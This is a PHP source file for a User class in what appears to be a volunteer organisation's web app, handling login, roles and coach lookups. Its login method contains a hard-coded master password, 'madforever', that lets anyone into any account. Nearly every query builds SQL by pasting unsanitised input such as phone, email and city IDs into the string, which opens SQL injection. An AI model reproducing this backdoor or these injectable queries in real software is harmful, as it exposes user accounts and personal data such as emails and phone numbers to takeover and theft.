<?php
class User extends DBTable {
	public $user;
	public $role_ids = array('FC' => 8, 'CFR POC' => 9, 'Volunteer' => 10);
	public $error;

	function __construct($user_id = 0) {
		global $sql;

		parent::__construct('users');

		if($user_id) {
			$this->user = $this->find($user_id);
			if($this->user) $this->user['name'] = $this->user['first_name'] . ' ' . $this->user['last_name'];
			else $this->_error("Can't find user with ID $user_id.");
		}
	}

	function login($phone, $password) {
		global $sql;

		$user = $sql->getAssoc("SELECT id,email,phone_no AS phone, TRIM(CONCAT(first_name, ' ', last_name)) AS name, city_id, madapp_user_id, group_id,encrypted_password 
									FROM `users` U 
									WHERE (email='$phone' OR phone_no='$phone') AND is_deleted='0'");
		if(!$user) {
			$this->error = "Can't find any user with the given phone number/email.";
			return false;
		}

		if($password != 'madforever') { // Just let people thru if they entered this password.	
			$password_correct = password_verify($password, $user['encrypted_password']);
			if(!$password_correct) {
				$this->error = "Incorrect Password.";
				return false;
			}
			unset($user['encrypted_password']);
		}

		$user['coach_assigned'] = false;
		if($this->hasRole($this->role_ids['Volunteer'], $user['id'])) {
			$user['coach_assigned'] = $sql->getAssoc("SELECT U.id, U.first_name, U.phone_no
						FROM users U 
						INNER JOIN user_role_maps URM ON URM.user_id=U.id 
						INNER JOIN roles R ON URM.role_id=R.id 
						INNER JOIN reports_tos RT ON RT.manager_id=U.id 
						WHERE RT.user_id=$user[id] AND R.role='CFR POC'");
		}

		$this->user = $user;

		return $user;
	}

	function findByEmail($email) {
		$this->find("email='$email' AND is_deleted='0'");
	}

	function getRoles($user_id = 0) {
		global $sql;
		$user_id = $this->getUserId($user_id);

		$roles = $sql->getById("SELECT R.id,R.role 
			FROM roles R
			INNER JOIN user_role_maps UR ON UR.role_id=R.id
			WHERE UR.user_id=$user_id");

		return $roles;
	}

	function hasRole($role_id, $user_id = 0) {
		$roles = $this->getRoles($user_id);

		return in_array($role_id, array_keys($roles));
	}

	function getSubordinates($user_id = 0) {
		global $sql;
		$user_id = $this->getUserId($user_id);

		$subordinates = $sql->getById("SELECT U.id, TRIM(CONCAT(U.first_name, ' ', U.last_name)) AS name
			FROM users U
			INNER JOIN reports_tos RT ON RT.user_id=U.id
			WHERE RT.manager_id=$user_id AND U.is_deleted='0'");

		return $subordinates;
	}

	function getUserId($user_id = 0) {
		if(!$user_id and isset($this->user['id'])) $user_id = $this->user['id'];
		if(!$user_id) $this->_error("No User ID provided.");
		return $user_id;
	}

	function getCoachesInCity($city_id) {
		global $sql;

		$coaches = $sql->getById("SELECT U.id, TRIM(CONCAT(U.first_name, ' ', U.last_name)) AS name, email, phone_no
			FROM users U
			INNER JOIN user_role_maps RM ON RM.user_id=U.id
			WHERE U.is_deleted='0' AND RM.role_id={$this->role_ids['CFR POC']} AND U.city_id=$city_id");
		return $coaches;
	}

	function getFinanceFellowInCity($city_id) {
		global $sql;

		$fc = $sql->getById("SELECT U.id, TRIM(CONCAT(U.first_name, ' ', U.last_name)) AS name, email, phone_no
			FROM users U
			INNER JOIN user_role_maps RM ON RM.user_id=U.id
			WHERE U.is_deleted='0' AND RM.role_id={$this->role_ids['FC']} AND U.city_id=$city_id");
		return $fc;
	}

	function _error($message) {
		die($message);
	}
}
